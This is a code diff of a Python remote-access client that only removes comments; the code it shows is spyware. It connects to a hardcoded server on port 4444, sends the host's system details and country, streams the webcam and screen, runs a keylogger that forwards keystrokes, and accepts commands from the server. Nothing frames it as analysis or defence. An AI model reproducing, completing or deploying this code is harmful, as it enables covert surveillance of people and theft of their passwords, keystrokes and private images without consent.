@@ -11,7 +11,6 @@ import requests
 SERVER_HOST = "10.0.1.33"  # Replace with your server's IP address
 SERVER_PORT = 4444
 
-# Webcam Stream
 def webcam_stream(client_socket):
     cap = cv2.VideoCapture(0)
     while True:
@@ -23,7 +22,6 @@ def webcam_stream(client_socket):
         time.sleep(0.1)
     cap.release()
 
-# Screen Sharing
 def screen_share(client_socket):
     with mss.mss() as sct:
         while True:
@@ -32,7 +30,6 @@ def screen_share(client_socket):
             client_socket.sendall(buffer.tobytes())
             time.sleep(0.1)
 
-# Keylogger
 def keylogger(client_socket):
     def send_keys():
         while True:
@@ -40,9 +37,9 @@ def keylogger(client_socket):
             keylog = ""
             for key in keys:
                 name = key.name
-                if name in ["space", "enter", "tab"]:  # Special keys to show
+                if name in ["space", "enter", "tab"]:
                     keylog += f"[{name.upper()}]"
-                elif name in ["caps lock", "ctrl", "shift", "alt", "backspace", "esc"]:  # Skip these keys
+                elif name in ["caps lock", "ctrl", "shift", "alt", "backspace", "esc"]:
                     continue
                 else:
                     keylog += name
@@ -50,7 +47,6 @@ def keylogger(client_socket):
             time.sleep(0.1)
     threading.Thread(target=send_keys).start()
 
-# Fetch Country
 def fetch_country():
     try:
         response = requests.get("https://ipinfo.io/json")
@@ -60,7 +56,6 @@ def fetch_country():
     except:
         return "Unknown"
 
-# Handle Commands from Server
 def handle_commands(client_socket):
     while True:
         try:
@@ -76,12 +71,10 @@ def handle_commands(client_socket):
         except:
             break
 
-# Main Client Function
 def main():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         client_socket.connect((SERVER_HOST, SERVER_PORT))
-        # Send basic info to the server
         client_socket.send(f"{platform.system()} {platform.release()} {platform.architecture()[0]}".encode())
         country = fetch_country()
         client_socket.send(country.encode())
